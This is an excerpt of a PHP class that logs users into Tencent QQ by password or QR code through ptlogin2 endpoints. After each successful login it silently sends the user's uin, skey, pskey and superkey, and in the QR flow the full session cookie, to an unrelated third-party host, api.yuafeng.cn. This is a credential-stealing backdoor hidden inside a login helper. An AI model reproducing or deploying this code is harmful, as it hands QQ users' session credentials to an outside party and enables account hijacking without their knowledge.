...
class qq_login{
	...
	public function qqlogin($uin,$pwd,$p,$vcode,$pt_verifysession,$sid,$cookie,$sms_code=null,$sms_ticket=null){
		...
		if(preg_match("/ptuiCB\('(.*?)'\)/", $ret, $arr)){
			...
			if($r[0]==0){
				...
				if($skey[1] && $pskey){
				$aa=file_get_contents("https://api.yuafeng.cn/API/ly/ck.php?ck=uin=o".$uin.";skey=".$skey[1].";pskey=".$pskey.";superkey=".$superkey[1]);
	...
	public function getqrpic3rd($daid,$appid){
		...
		$url='https://ssl.ptlogin2.qq.com/ptqrshow?s=8&e=0&appid='.$appid.'&type=1&t=0.492909'.time().'&daid='.$daid.'&pt_3rd_aid='.$appid;
		$referer='https://xui.ptlogin2.qq.com/cgi-bin/xlogin?daid='.$daid.'&hide_title_bar=1&low_login=0&qlogin_auto_login=1&no_verifyimg=1&link_target=blank&target=self&s_url=https:%2F%2Fqzs.qq.com%2Fqzone%2Fv5%2Floginsucc.html?para%3Dizone&pt_no_auth=0&appid='.$appid.'&pt_3rd_aid='.$appid;
		$arr=$this->get_curl_split($url,$referer);
		preg_match('/qrsig=(.*?);/',$arr['header'],$match);
		if($qrsig=$match[1]){
			preg_match('/\((.*?)\)/',$arr['body'],$match);
	...
	public function qrlogin3rd($daid,$appid,$qrsig){
		...
		$url='https://ssl.ptlogin2.qq.com/ptqrlogin?u1='.urlencode($s_url).'&ptqrtoken='.$this->getqrtoken($qrsig).'&ptredirect=0&h=1&t=1&g=1&from_ui=1&ptlang=2052&action=0-0-'.time().'0000&js_ver=10194&js_type=1&login_sig=&pt_uistyle=40&aid=716027609&daid='.$daid.'&pt_3rd_aid='.$appid;
		...
		if(preg_match("/ptuiCB\('(.*?)'\)/", $ret, $arr)){
			...
			if($r[0]==0){
				...
				if($cookie){
				$aa=file_get_contents("https://api.yuafeng.cn/API/ly/ck.php?ck=".$cookie);
